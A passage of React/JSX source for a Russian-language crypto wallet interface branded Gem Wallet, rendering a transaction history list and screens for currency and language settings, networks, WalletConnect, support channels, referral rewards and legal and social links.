        <div style={{ position: "absolute", right: 16 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M3 6h18M7 12h10M11 18h2" stroke="white" strokeWidth="2" strokeLinecap="round" />
          </svg>
        </div>
      </div>

      {allTx.length === 0 ? (
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 16, padding: "0 40px" }}>
          <div style={{ width: 80, height: 80, borderRadius: "50%", background: DS.card, display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 40, height: 40 }}>
              <circle cx="12" cy="12" r="9" stroke="white" strokeWidth="1.8" opacity="0.2" />
              <path d="M12 7v5l3 3" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" opacity="0.2" />
            </svg>
          </div>
          <div style={{ textAlign: "center" }}>
            <div style={{ color: "white", fontWeight: 700, fontSize: 18, marginBottom: 6 }}>Транзакций пока нет</div>
            <div style={{ color: DS.muted, fontSize: 14 }}>Ваши операции появятся здесь</div>
          </div>
        </div>
      ) : (
        <div style={{ padding: "0 16px" }}>
          <div style={{ padding: "12px 0 8px" }}>
            <span style={{ color: DS.muted, fontSize: 13, fontWeight: 600 }}>Сегодня</span>
          </div>

          <div style={{ background: DS.card, borderRadius: 20, overflow: "hidden", border: `1px solid ${DS.border}` }}>
            {allTx.map((tx, i) => {
                const isPending = tx.status === 'В процессе' && tx.pendingUntil;
                const isCancelled = tx.status === 'Отменена';
                const amtColor = isPending ? '#FF9F0A' : isCancelled ? DS.muted : tx.positive ? DS.green : DS.danger;
                const badgeBg = isPending ? '#FF9F0A' : isCancelled ? '#636366' : tx.positive ? DS.green : DS.danger;
                return (
                <div key={tx.id} onClick={() => setSelectedTx(tx)}
                  style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer",
                    borderBottom: i < allTx.length - 1 ? `1px solid ${DS.border}` : "none",
                    background: isPending ? "rgba(255,159,10,0.04)" : "none" }}>
                  <div style={{ position: "relative", width: 48, height: 48, flexShrink: 0 }}>
                    <div style={{ width: 48, height: 48, borderRadius: "50%", overflow: "hidden" }}>
                      <TokenIcon tokenId={tx.tokenId} size={48} badgeSize={0} />
                    </div>
                    <div style={{ position: "absolute", bottom: -2, right: -2, width: 20, height: 20, borderRadius: "50%",
                      background: badgeBg,
                      border: `2px solid ${DS.card}`,
                      display: "flex", alignItems: "center", justifyContent: "center" }}>
                      {isPending ? (
                        <svg viewBox="0 0 24 24" fill="none" style={{ width: 11, height: 11 }}>
                          <circle cx="12" cy="12" r="9" stroke="white" strokeWidth="2.5" />
                          <path d="M12 7v5l3 3" stroke="white" strokeWidth="2.5" strokeLinecap="round" />
                        </svg>
                      ) : isCancelled ? (
                        <svg viewBox="0 0 24 24" fill="none" style={{ width: 11, height: 11 }}>
                          <path d="M18 6L6 18M6 6l12 12" stroke="white" strokeWidth="3" strokeLinecap="round" />
                        </svg>
                      ) : (
                        <svg viewBox="0 0 24 24" fill="none" style={{ width: 12, height: 12 }}>
                          {tx.positive
                            ? <path d="M12 17V7M7 12l5 5 5-5" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                            : <path d="M12 7v10M7 12l5-5 5 5" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                          }
                        </svg>
                      )}
                    </div>
                  </div>
                  <div style={{ flex: 1, marginLeft: 14 }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <div style={{ color: "white", fontWeight: 700, fontSize: 16 }}>{tx.type}</div>
                      {tx.status === 'Ошибка' && <span style={{ background: "rgba(255,69,58,0.15)", color: DS.danger, fontSize: 10, padding: "2px 6px", borderRadius: 4, fontWeight: 700 }}>Ошибка</span>}
                    </div>
                    <div style={{ color: DS.muted, fontSize: 13, marginTop: 2 }}>{tx.sub}</div>
                  </div>
                  <div style={{ textAlign: "right", minWidth: 0 }}>
                    <div style={{ color: amtColor, fontWeight: 700, fontSize: 16, lineHeight: 1.1 }}>{tx.amount}</div>
                    <div style={{ color: amtColor, fontWeight: 600, fontSize: 12, opacity: 0.85, marginTop: 1 }}>{tx.symbol}</div>
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "flex-end", gap: 4, marginTop: 3 }}>
                      {isPending ? (
                        <>
                          <span style={{ color: "#FF9F0A", fontSize: 11, fontWeight: 600 }}>В процессе</span>
                          <PendingActivityTimer pendingUntil={tx.pendingUntil} />
                        </>
                      ) : (
                        <span style={{ color: DS.muted, fontSize: 11 }}>{tx.status === 'Отменена' ? 'Отменена' : tx.status === 'Ошибка' ? 'Ошибка' : 'Успешно'}</span>
                      )}
                    </div>
                  </div>
                </div>
                );
              })}
          </div>
        </div>
      )}

      <div style={{ flex: 1 }} />
    </>
  );
});

/* ─── Screen: App Settings (Валюта / Язык) ──────────────────── */
function AppSettingsScreen({ onBack }) {
  const [subScreen, setSubScreen] = useState(null);
  const { settings, updateSetting } = useWallet();

  const currencyCode = settings?.currencyCode || 'USD';
  const languageCode = settings?.languageCode || 'ru';
  const curObj = CURRENCIES.find(c => c.code === currencyCode) || CURRENCIES[0];
  const langObj = LANGUAGES.find(l => l.code === languageCode) || LANGUAGES[0];
  const T = getLang(settings);

  const handleSelectCurrency = (c) => {
    updateSetting('currencyCode', c.code);
    setSubScreen(null);
  };
  const handleSelectLanguage = (l) => {
    updateSetting('languageCode', l.code);
    setSubScreen(null);
  };

  if (subScreen === 'currency') return <CurrencyScreen onBack={() => setSubScreen(null)} selectedCode={currencyCode} onSelect={handleSelectCurrency} />;
  if (subScreen === 'language') return <LanguageScreen onBack={() => setSubScreen(null)} selectedCode={languageCode} onSelect={handleSelectLanguage} T={T} />;

  const items = [
    {
      label: T.currency,
      value: `${curObj.flag} ${curObj.code}`,
      icon: <div style={{ width: 36, height: 36, borderRadius: 10, background: '#FF9500', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <svg viewBox='0 0 24 24' fill='none' style={{ width: 20, height: 20 }}>
          <circle cx='12' cy='12' r='9' stroke='white' strokeWidth='1.8' />
          <path d='M12 6v12M9 9h4.5a1.5 1.5 0 0 1 0 3H9m0 0h5a1.5 1.5 0 0 1 0 3H9' stroke='white' strokeWidth='1.8' strokeLinecap='round' />
        </svg>
      </div>,
      onPress: () => setSubScreen('currency'),
    },
    {
      label: T.language,
      value: `${langObj.flag} ${langObj.name}`,
      icon: <div style={{ width: 36, height: 36, borderRadius: 10, background: '#30B0C7', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <svg viewBox='0 0 24 24' fill='none' style={{ width: 20, height: 20 }}>
          <circle cx='12' cy='12' r='9' stroke='white' strokeWidth='1.8' />
          <path d='M12 3c0 0-4 4-4 9s4 9 4 9M12 3c0 0 4 4 4 9s-4 9-4 9M3 12h18' stroke='white' strokeWidth='1.5' />
        </svg>
      </div>,
      onPress: () => setSubScreen('language'),
    },
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={{ display: 'flex', alignItems: 'center', padding: '16px 20px', gap: 12 }}>
        <button onClick={onBack} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
          <svg viewBox='0 0 24 24' fill='none' style={{ width: 22, height: 22 }}>
            <path d='M15 19l-7-7 7-7' stroke='white' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round' />
          </svg>
        </button>
        <span style={{ flex: 1, color: 'white', fontWeight: 600, fontSize: 17, textAlign: 'center' }}>Настройки</span>
        <div style={{ width: 30 }} />
      </div>

      <div style={{ background: '#181820', borderRadius: 16, margin: '8px 16px', overflow: 'hidden' }}>
        {items.map((item, i) => (
          <div key={item.label} onClick={item.onPress}
            style={{ display: 'flex', alignItems: 'center', padding: '12px 16px', cursor: 'pointer',
              borderBottom: i < items.length - 1 ? '1px solid #2A2A2C' : 'none' }}>
            {item.icon}
            <span style={{ flex: 1, color: 'white', fontSize: 16, marginLeft: 14 }}>{item.label}</span>
            {item.value && <span style={{ color: '#888', fontSize: 15, marginRight: 6 }}>{item.value}</span>}
            <ChevronRight />
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── Screen: Currency ───────────────────────────────────────── */
function CurrencyScreen({ onBack, selectedCode, onSelect }) {
  const CheckIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
      <path d="M20 6L9 17l-5-5" stroke="#3B7DFF" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 600, fontSize: 17, textAlign: "center" }}>Валюта</span>
        <div style={{ width: 30 }} />
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "6px 16px", overflow: "hidden" }}>
        {CURRENCIES.map((item, i) => (
          <div key={item.code} onClick={() => onSelect(item)}
            style={{ display: "flex", alignItems: "center", padding: "14px 16px", cursor: "pointer",
              borderBottom: i < CURRENCIES.length - 1 ? "1px solid #2A2A2C" : "none" }}>
            <span style={{ fontSize: 22, marginRight: 14 }}>{item.flag}</span>
            <div style={{ flex: 1 }}>
              <div style={{ color: "white", fontSize: 16, fontWeight: 500 }}>{item.code} — {item.symbol}</div>
              <div style={{ color: "#888", fontSize: 13, marginTop: 1 }}>{item.name}</div>
            </div>
            {selectedCode === item.code && <CheckIcon />}
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── Screen: Language ───────────────────────────────────────── */
function LanguageScreen({ onBack, selectedCode, onSelect, T }) {
  const CheckIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
      <path d="M20 6L9 17l-5-5" stroke="#3B7DFF" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 600, fontSize: 17, textAlign: "center" }}>{T ? T.language : "Язык"}</span>
        <div style={{ width: 30 }} />
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "6px 16px", overflow: "hidden" }}>
        {LANGUAGES.map((item, i) => (
          <div key={item.code} onClick={() => onSelect(item)}
            style={{ display: "flex", alignItems: "center", padding: "15px 16px", cursor: "pointer",
              borderBottom: i < LANGUAGES.length - 1 ? "1px solid #2A2A2C" : "none" }}>
            <span style={{ fontSize: 22, marginRight: 14 }}>{item.flag}</span>
            <span style={{ flex: 1, color: "white", fontSize: 16 }}>{item.name}</span>
            {selectedCode === item.code && <CheckIcon />}
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── Screen: Networks ───────────────────────────────────────── */
function NetworksScreen({ onBack }) {
  const [search, setSearch] = useState("");
  const networks = [
    { name: "Статус",       Icon: () => <div style={{ width: "100%", height: "100%", borderRadius: "50%", background: "linear-gradient(145deg, #4F8FFF, #1A55E3)", display: "flex", alignItems: "center", justifyContent: "center" }}><svg viewBox="0 0 24 24" fill="none" style={{ width: "60%", height: "60%" }}><path d="M12 2L2 7l10 5 10-5-10-5z" stroke="white" strokeWidth="1.8" /></svg></div> },
    { name: "Bitcoin",      tokenId: "BTC"  },
    { name: "Ethereum",     tokenId: "ETH"  },
    { name: "BNB Chain",    tokenId: "BNB"  },
    { name: "Solana",       tokenId: "SOL"  },
    { name: "TRON",         tokenId: "TRX"  },
    { name: "TON",          tokenId: "TON"  },
    { name: "Osmosis",      Icon: () => <div style={{ width: "100%", height: "100%", borderRadius: "50%", background: "#6E3DD4", display: "flex", alignItems: "center", justifyContent: "center" }}><span style={{ color: "white", fontSize: "55%", fontWeight: 700 }}>OSM</span></div> },
    { name: "Bitcoin Cash", Icon: () => <div style={{ width: "100%", height: "100%", borderRadius: "50%", background: "#8DC351", display: "flex", alignItems: "center", justifyContent: "center" }}><svg viewBox="0 0 24 24" fill="none" style={{ width: "60%", height: "60%" }}><circle cx="12" cy="12" r="9" stroke="white" strokeWidth="1.8" /><path d="M12 6v12M9 9h4.5a1.5 1.5 0 0 1 0 3H9m0 0h5a1.5 1.5 0 0 1 0 3H9" stroke="white" strokeWidth="1.8" strokeLinecap="round" /></svg></div> },
    { name: "Litecoin",     tokenId: "LTC"  },
    { name: "Arbitrum",     tokenId: "ARB"  },
  ];

  const filtered = networks.filter(n => n.name.toLowerCase().includes(search.toLowerCase()));

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 600, fontSize: 17, textAlign: "center" }}>Сети</span>
        <div style={{ width: 30 }} />
      </div>

      <div style={{ padding: "0 16px 14px" }}>
        <div style={{ background: "#252530", borderRadius: 12, display: "flex", alignItems: "center", padding: "10px 14px", gap: 8 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18, flexShrink: 0 }}>
            <circle cx="11" cy="11" r="8" stroke="#888" strokeWidth="1.8" />
            <path d="M21 21l-4.35-4.35" stroke="#888" strokeWidth="1.8" strokeLinecap="round" />
          </svg>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Поиск"
            style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 15, width: "100%" }} />
        </div>
      </div>

      {filtered.slice(0, 1).map((net) => (
        <div key={net.name} style={{ background: "#181820", borderRadius: 16, margin: "0 16px 12px", overflow: "hidden" }}>
          <div style={{ display: "flex", alignItems: "center", padding: "14px 16px", cursor: "pointer" }}>
            <div style={{ width: 44, height: 44, flexShrink: 0 }}>
              {net.tokenId ? <TokenIcon tokenId={net.tokenId} size={44} badgeSize={18} /> : <net.Icon />}
            </div>
            <span style={{ flex: 1, color: "white", fontSize: 16, marginLeft: 12 }}>{net.name}</span>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}>
              <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
            </svg>
          </div>
        </div>
      ))}

      <div style={{ background: "#181820", borderRadius: 16, margin: "0 16px", overflow: "hidden" }}>
        {filtered.slice(1).map((net, i) => (
          <div key={net.name} style={{ display: "flex", alignItems: "center", padding: "14px 16px", cursor: "pointer",
            borderBottom: i < filtered.slice(1).length - 1 ? "1px solid #2A2A2C" : "none" }}>
            <div style={{ width: 44, height: 44, flexShrink: 0 }}>
              {net.tokenId ? <TokenIcon tokenId={net.tokenId} size={44} badgeSize={18} /> : <net.Icon />}
            </div>
            <span style={{ flex: 1, color: "white", fontSize: 16, marginLeft: 12 }}>{net.name}</span>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}>
              <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
            </svg>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── Screen: Settings ───────────────────────────────────────── */
function WalletConnectScreen({ onBack }) {
  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <TopBar title="WalletConnect" onBack={onBack}
        rightEl={
          <div onClick={() => openInApp('https://gemwallet.com/docs/guides/how-to-use-walletconnect')}
            style={{ cursor: 'pointer', padding: 4, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
              <circle cx="12" cy="12" r="9" stroke="white" strokeWidth="1.8" />
              <path d="M12 8v1M12 11v5" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
            </svg>
          </div>
        }
      />
      <div style={{ background: "#181820", borderRadius: 16, margin: "8px 16px 0", overflow: "hidden" }}>
        {[
          { label: "Вставить", icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><rect x="8" y="2" width="13" height="17" rx="2" stroke="white" strokeWidth="1.7" /><path d="M3 6v13a2 2 0 0 0 2 2h10" stroke="white" strokeWidth="1.7" strokeLinecap="round" /></svg> },
          { label: "Сканировать QR-код", icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}><rect x="3" y="3" width="7" height="7" rx="1" stroke="white" strokeWidth="1.7" /><rect x="14" y="3" width="7" height="7" rx="1" stroke="white" strokeWidth="1.7" /><rect x="3" y="14" width="7" height="7" rx="1" stroke="white" strokeWidth="1.7" /><rect x="5" y="5" width="3" height="3" fill="white" /><rect x="16" y="5" width="3" height="3" fill="white" /><rect x="5" y="16" width="3" height="3" fill="white" /></svg> },
        ].map((item, i, arr) => (
          <div key={item.label} style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer",
            borderBottom: i < arr.length - 1 ? "1px solid #2A2A2C" : "none" }}>
            <span style={{ marginRight: 14, opacity: 0.8 }}>{item.icon}</span>
            <span style={{ color: "white", fontSize: 16 }}>{item.label}</span>
          </div>
        ))}
      </div>
      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 16, color: "#555" }}>
        <div style={{ width: 72, height: 72, borderRadius: "50%", background: "#252530", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 36, height: 36 }}>
            <rect x="3" y="3" width="7" height="7" rx="1" stroke="#888" strokeWidth="1.7" />
            <rect x="14" y="3" width="7" height="7" rx="1" stroke="#888" strokeWidth="1.7" />
            <rect x="3" y="14" width="7" height="7" rx="1" stroke="#888" strokeWidth="1.7" />
            <rect x="5" y="5" width="3" height="3" fill="#888" />
            <rect x="16" y="5" width="3" height="3" fill="#888" />
            <rect x="5" y="16" width="3" height="3" fill="#888" />
            <path d="M14 14h3v3M17 14v7M14 17h3" stroke="#888" strokeWidth="1.5" strokeLinecap="round" />
          </svg>
        </div>
        <div style={{ textAlign: "center" }}>
          <div style={{ color: "white", fontWeight: 600, fontSize: 16, marginBottom: 6 }}>Нет активных подключений</div>
          <div style={{ color: "#888", fontSize: 14 }}>Отсканируйте или вставьте код для<br />подключения к DApp</div>
        </div>
      </div>
    </div>
  );
}

function SupportScreen({ onBack }) {
  const channels = [
    {
      id: "tg",
      label: "Telegram поддержка",
      sub: "Официальный канал поддержки",
      url: "https://t.me/GemWalletSupport",
      bg: "#0098EA",
      icon: <svg viewBox="0 0 24 24" fill="white" style={{ width: 22, height: 22 }}><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8l-1.68 7.92c-.12.56-.46.7-.94.44l-2.6-1.92-1.25 1.21c-.14.14-.26.26-.52.26l.18-2.62 4.74-4.28c.2-.18-.04-.28-.32-.1L7.46 14.9l-2.56-.8c-.56-.18-.58-.56.12-.82l10-3.86c.46-.18.86.1.62.58z"/></svg>,
    },
    {
      id: "x",
      label: "X (Twitter) поддержка",
      sub: "@GemWalletApp",
      url: "https://x.com/GemWalletApp",
      bg: "#111",
      icon: <svg viewBox="0 0 24 24" fill="white" style={{ width: 22, height: 22 }}><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.746l7.73-8.835L1.254 2.25H8.08l4.259 5.63L18.244 2.25z"/></svg>,
    },
    {
      id: "help",
      label: "Центр помощи",
      sub: "Гайды и FAQ на gemwallet.com",
      url: "https://gemwallet.com/docs",
      bg: "#3B7DFF",
      icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}><circle cx="12" cy="12" r="9" stroke="white" strokeWidth="1.8"/><path d="M9.5 9a2.5 2.5 0 0 1 5 0c0 1.5-2.5 2-2.5 3.5M12 17h.01" stroke="white" strokeWidth="1.8" strokeLinecap="round"/></svg>,
    },
  ];
  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, background: "#0D0D12" }}>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 700, fontSize: 18, textAlign: "center" }}>Поддержка</span>
        <div style={{ width: 30 }} />
      </div>

      <div style={{ padding: "8px 16px 20px", display: "flex", flexDirection: "column", alignItems: "center" }}>
        <div style={{ width: 68, height: 68, borderRadius: "50%", background: "linear-gradient(145deg,#4F8FFF,#1A55E3)", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 14 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 36, height: 36 }}>
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <div style={{ color: "white", fontWeight: 700, fontSize: 18, marginBottom: 6 }}>Нужна помощь?</div>
        <div style={{ color: "#888", fontSize: 14, textAlign: "center", maxWidth: 260, lineHeight: 1.5 }}>
          Выберите удобный способ связи с командой поддержки Gem Wallet
        </div>
      </div>

      <div style={{ background: "#181820", borderRadius: 20, margin: "0 16px", overflow: "hidden", border: "1px solid #252528" }}>
        {channels.map((ch, i) => (
          <div key={ch.id} onClick={() => { const url = ch.url; const tg = window.Telegram?.WebApp; if (url.startsWith('https://t.me/') && tg?.openTelegramLink) { tg.openTelegramLink(url); } else { openInApp(url); } }}
            style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer",
              borderBottom: i < channels.length - 1 ? "1px solid #252528" : "none",
              transition: "background 0.15s", active: "background: rgba(255,255,255,0.04)" }}>
            <div style={{ width: 46, height: 46, borderRadius: 14, background: ch.bg, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              {ch.icon}
            </div>
            <div style={{ flex: 1, marginLeft: 14 }}>
              <div style={{ color: "white", fontWeight: 600, fontSize: 16 }}>{ch.label}</div>
              <div style={{ color: "#888", fontSize: 13, marginTop: 2 }}>{ch.sub}</div>
            </div>
            <ChevronRight />
          </div>
        ))}
      </div>

      <div style={{ margin: "16px 16px 0", padding: "14px 16px", background: "rgba(59,125,255,0.08)", borderRadius: 14, border: "1px solid rgba(59,125,255,0.18)" }}>
        <div style={{ color: "#3B7DFF", fontWeight: 600, fontSize: 14, marginBottom: 4 }}>Официальный Telegram</div>
        <div style={{ color: "#888", fontSize: 13, lineHeight: 1.5 }}>
          Для быстрой помощи напишите нам в Telegram. Мы отвечаем в течение нескольких часов.
        </div>
      </div>
    </div>
  );
}

function RewardsScreen({ onBack }) {
  const [modal, setModal] = useState(null); // null | "username" | "referral"
  const [username, setUsername] = useState("");
  const [referral, setReferral] = useState("");

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, position: "relative" }}>
      <TopBar title="Награды" onBack={onBack} />
      <div style={{ margin: "8px 16px 0", background: "#181820", borderRadius: 20, padding: "32px 24px", textAlign: "center" }}>
        <div style={{ fontSize: 56, marginBottom: 16 }}>🎁</div>
        <div style={{ color: "white", fontWeight: 700, fontSize: 20, marginBottom: 10 }}>Пригласите друзей</div>
        <div style={{ color: "#888", fontSize: 14, marginBottom: 20, lineHeight: 1.5 }}>
          Зарабатывай <span style={{ color: "white", fontWeight: 600 }}>100</span> баллов за каждого<br />друга, который присоединится.
        </div>
        <div style={{ display: "flex", justifyContent: "center", gap: 24, marginBottom: 24 }}>
          {[{ emoji: "👥", label: "Пригласите\nдрузей" }, { emoji: "💎", label: "Зарабатывай\nте баллы" }, { emoji: "🎉", label: "Получайте\nнаграды" }].map(item => (
            <div key={item.label} style={{ textAlign: "center" }}>
              <div style={{ fontSize: 28, marginBottom: 6 }}>{item.emoji}</div>
              <div style={{ color: "#888", fontSize: 12, whiteSpace: "pre-line" }}>{item.label}</div>
            </div>
          ))}
        </div>
        <button onClick={() => setModal("username")}
          style={{ width: "100%", padding: "16px", borderRadius: 14, border: "none", background: "linear-gradient(145deg, #4F8FFF, #1A55E3)",
            color: "white", fontSize: 16, fontWeight: 600, cursor: "pointer" }}>
          Начать
        </button>
      </div>
      <div style={{ margin: "12px 16px 0" }}>
        <button onClick={() => setModal("referral")}
          style={{ width: "100%", padding: "16px", borderRadius: 14, border: "none", background: "white",
            color: "#111", fontSize: 16, fontWeight: 600, cursor: "pointer" }}>
          Активируйте код
        </button>
        <div style={{ color: "#888", fontSize: 13, textAlign: "center", marginTop: 8 }}>У вас есть реферальный код от друга?</div>
      </div>

      {modal && (
        <>
          <div onClick={() => setModal(null)}
            style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.5)", zIndex: 50 }} />
          <div style={{ position: "fixed", bottom: 0, left: "50%", transform: "translateX(-50%)", width: "100%", maxWidth: 420,
            background: "#181820", borderRadius: "20px 20px 0 0", zIndex: 51, padding: "0 0 32px" }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px 20px", borderBottom: "1px solid #222228" }}>
              <button onClick={() => setModal(null)} style={{ background: "none", border: "none", cursor: "pointer", color: "#3B7DFF", fontSize: 16 }}>Отмена</button>
              <span style={{ color: "white", fontWeight: 600, fontSize: 16 }}>
                {modal === "username" ? "Создать имя пользователя" : "Реферальный код"}
              </span>
              <button style={{ background: "none", border: "none", cursor: "pointer", color: "#3B7DFF", fontSize: 16, fontWeight: 600 }}>Готово</button>
            </div>
            <div style={{ padding: "16px" }}>
              <input
                value={modal === "username" ? username : referral}
                onChange={e => modal === "username" ? setUsername(e.target.value) : setReferral(e.target.value)}
                placeholder={modal === "username" ? "Имя пользователя" : "Реферальный код"}
                  style={{ width: "100%", background: "#252530", border: "none", borderRadius: 12, padding: "14px 16px",
                  color: "white", fontSize: 16, outline: "none", boxSizing: "border-box" }}
              />
              {modal === "username" && (
                <div style={{ color: "#888", fontSize: 13, marginTop: 8, paddingLeft: 4 }}>
                  Это будет ваш никнейм для текущего кошелька.
                </div>
              )}
            </div>
          </div>
        </>
      )}
    </div>
  );
}

function AboutScreen({ onBack }) {
  const legalLinks = [
    { label: "Условия предоставления услуг", url: "https://gemwallet.com/terms" },
    { label: "Политика конфиденциальности", url: "https://gemwallet.com/privacy" },
    { label: "Посетить сайт", url: "https://gemwallet.com" },
    { label: "Центр помощи", url: "https://gemwallet.com/docs" },
  ];

  const socialLinks = [
    { label: "X (Twitter)", sub: "@GemWalletApp", url: "https://x.com/GemWalletApp", bg: "#111",
      icon: <svg viewBox="0 0 24 24" fill="white" style={{ width: 18, height: 18 }}><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.746l7.73-8.835L1.254 2.25H8.08l4.259 5.63L18.244 2.25z"/></svg> },
    { label: "Telegram", sub: "t.me/gemwallet", url: "https://t.me/gemwallet_official", bg: "#0098EA",
      icon: <svg viewBox="0 0 24 24" fill="white" style={{ width: 18, height: 18 }}><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8l-1.68 7.92c-.12.56-.46.7-.94.44l-2.6-1.92-1.25 1.21c-.14.14-.26.26-.52.26l.18-2.62 4.74-4.28c.2-.18-.04-.28-.32-.1L7.46 14.9l-2.56-.8c-.56-.18-.58-.56.12-.82l10-3.86c.46-.18.86.1.62.58z"/></svg> },
    { label: "YouTube", sub: "youtube.com/@gemwallet", url: "https://www.youtube.com/@gemwallet", bg: "#FF0000",
      icon: <svg viewBox="0 0 24 24" fill="white" style={{ width: 18, height: 18 }}><path d="M23 7s-.3-1.9-1.2-2.7c-1.1-1.2-2.4-1.2-3-1.3C16.2 3 12 3 12 3s-4.2 0-6.8.1c-.6.1-1.9.1-3 1.3C1.3 5.1 1 7 1 7S.7 9.1.7 11.3v2c0 2.1.3 4.3.3 4.3s.3 1.9 1.2 2.7c1.1 1.2 2.6 1.1 3.3 1.2C7.5 21.7 12 21.7 12 21.7s4.2 0 6.8-.2c.6-.1 1.9-.1 3-1.3.9-.8 1.2-2.7 1.2-2.7s.3-2.1.3-4.3v-2C23.3 9.1 23 7 23 7zM9.7 15.5V8.4l8.1 3.6-8.1 3.5z"/></svg> },
    { label: "GitHub", sub: "github.com/gemwalletcom", url: "https://github.com/gemwalletcom", bg: "#161B22",
